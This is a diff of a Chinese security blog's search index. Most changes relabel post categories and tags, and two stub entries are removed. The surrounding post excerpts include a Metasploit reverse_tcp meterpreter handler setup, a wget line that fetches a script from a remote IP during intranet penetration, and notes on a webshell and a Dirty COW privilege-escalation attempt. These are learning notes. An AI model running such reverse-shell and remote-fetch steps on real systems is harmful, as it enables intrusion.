@@ -68,7 +68,7 @@
 <p>总体来说，靶机获取webshell这里都不算太难，只有最后反弹和提权是遇到了一些坑，还是需要多学习学习。</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>靶场实战</category>
       </categories>
       <tags>
         <tag>靶场实战</tag>
@@ -166,7 +166,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gxxw5lin96j31fq0u0q6s.jpg" alt="image-20210915181508082"></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>虚拟逃逸</tag>
@@ -893,7 +893,7 @@
 <p>获取反弹回来的shell,进入msf</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">选择模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">设置</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.1</span><br><span class="line">set lport 4444</span><br><span class="line">set ExirOnSession flase</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>]]></content>
       <categories>
-        <category>工具</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Metasploit</tag>
@@ -1246,32 +1246,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Thinkphp注入学习(暂未更新)</title>
-    <url>/2020/06/13/Thinkphp%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfpzs12ludj31c00u0tfe.jpg" alt="74"></p>
-<span id="more"></span>
-
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>Thinkphp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Scapy嗅探</title>
-    <url>/2019/07/27/Scapy%E5%97%85%E6%8E%A2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>环境是kali，输入scapy命令</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>嗅探</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typrcho反序列化漏洞学习</title>
     <url>/2020/10/16/Typrcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>/img/x.jpg</p>
@@ -1316,7 +1290,7 @@
 <h4 id="0x02-Web页面请求流程"><a href="#0x02-Web页面请求流程" class="headerlink" title="0x02 Web页面请求流程"></a>0x02 Web页面请求流程</h4><h4 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h4><p>DNS(域名解析协议)详解: <a href="https://blog.csdn.net/baidu_37964071/article/details/80500825">https://blog.csdn.net/baidu_37964071/article/details/80500825</a></p>
 ]]></content>
       <categories>
-        <category>HTML</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
         <tag>协议</tag>
@@ -1450,7 +1424,7 @@
 
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>docker基础</tag>
@@ -1604,7 +1578,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmmfnddr91j31gr0u0djy.jpg" alt="image-20210113222208024"></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>容器数据卷,Dockerfile</tag>
@@ -1694,7 +1668,7 @@
 <p><a href="https://www.cnblogs.com/momoyan/p/12437312.html">https://www.cnblogs.com/momoyan/p/12437312.html</a></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>docker基础</tag>
@@ -1794,7 +1768,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmhzmcxy6fj31bz0u0n90.jpg" alt="image-20210110013957776"></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>docker网络</tag>
@@ -1968,7 +1942,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmir37mp70j30wm0rsacl.jpg" alt="image-20210110174925513"></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>Swarm、集群</tag>
@@ -2042,7 +2016,7 @@
 <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmmg75m8vnj315m0u0tpi.jpg" alt="image-20210113224236587"></p>
 ]]></content>
       <categories>
-        <category>docker</category>
+        <category>Docker</category>
       </categories>
       <tags>
         <tag>Compose</tag>
@@ -2114,7 +2088,7 @@
 <h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>最后wordpress密码还是没有爆破出来…<br>惯性思维一看开放web就专门搞web去了，没有注意到其他端口服务的漏洞…<br>一如往常的还是得多学习多积累…</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>靶场实战</category>
       </categories>
       <tags>
         <tag>靶场实战</tag>
@@ -2222,6 +2196,9 @@
 
 <p>wget <a href="http://47.244.13.36:8080/ip3.py">http://47.244.13.36:8080/ip3.py</a></p>
 ]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
       <tags>
         <tag>内网渗透</tag>
       </tags>
@@ -2703,14 +2680,14 @@
 <p>之前有点钻牛角尖了，然后也理解错了,这个坑终于填了，阔以的，感谢组长。</p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>Java基础</category>
       </categories>
       <tags>
-        <tag>JAVA</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
-    <title>内网测试</title>
+    <title>初探内网渗透</title>
     <url>/2019/07/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>公司的测试站，拿到了一个shell，然后准备内网一波，技术菜，第一次尝试内网渗透</p>
 <h3 id="0x01-反弹shell"><a href="#0x01-反弹shell" class="headerlink" title="0x01 反弹shell"></a>0x01 反弹shell</h3><p>公司大佬仍了一个shell，使用冰蝎连接后发现命令行不好用，命令无法成功执行，因为是linux的，所以准备提权用脏牛提权一波,但是执行gcc命令，没有返回。。没办法只能上msf了，开整.</p>
@@ -2726,7 +2703,7 @@
 <p>看了下权限，很低，所以尝试用脏牛，但是内核是4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 版本太高了，没办法提权，只能测试其他方法了</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>内网渗透</tag>
@@ -3342,9 +3319,6 @@
       <categories>
         <category>内网渗透</category>
       </categories>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
   </entry>
   <entry>
     <title>黑客秘籍3-赛前准备-1</title>
@@ -3589,7 +3563,7 @@
 <h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>出现的问题：<br>1、第一个卡住的点是在Magic_Box目录，当时用dirbuster一直扫描不出来目录，御剑啥的都上了，虽然最后扫描出来了，也卡了半天。<br>2、在就是对linux的反弹shell这里，跟着靶场中需要payload需要编码后执行，我编码后shell一直不反弹，最后用了perl反弹方法，回显端用的还是前几次的python。<br>3、第三个是提权这里。。因为没仔细看靶场中的内容(不应该边看亲爱的热爱的，边做靶场。。。)，导致以为su命令无法使用，在反弹shell这里重新用了靶场中的代码，可以成功反弹回来，上次无法反弹应该是编码的问题(但是其他靶场文章里面貌似大部分都是编码过的)。<br>总结：<br>技术上面盲区还是有点多，虽然做了几个靶场，也有一些思路，值得庆幸的是Acid靶场第一个卡住的点是在目录爆破这里，之前都是个人独立完成的，算是进步了不少，以后还是要多做靶场，好好学习，天天向上，追剧看来得结束了。。。</p>
 ]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>靶场实战</category>
       </categories>
       <tags>
         <tag>靶场实战</tag>
@@ -4524,7 +4498,7 @@
 <p><a href="https://blog.csdn.net/weixin_44604541/article/details/108921381">https://blog.csdn.net/weixin_44604541/article/details/108921381</a></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>JWT</category>
       </categories>
       <tags>
         <tag>会话传递</tag>
@@ -5159,10 +5133,10 @@
 
 ]]></content>
       <categories>
-        <category>SQL注入</category>
+        <category>数据库</category>
       </categories>
       <tags>
-        <tag>学习笔记</tag>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
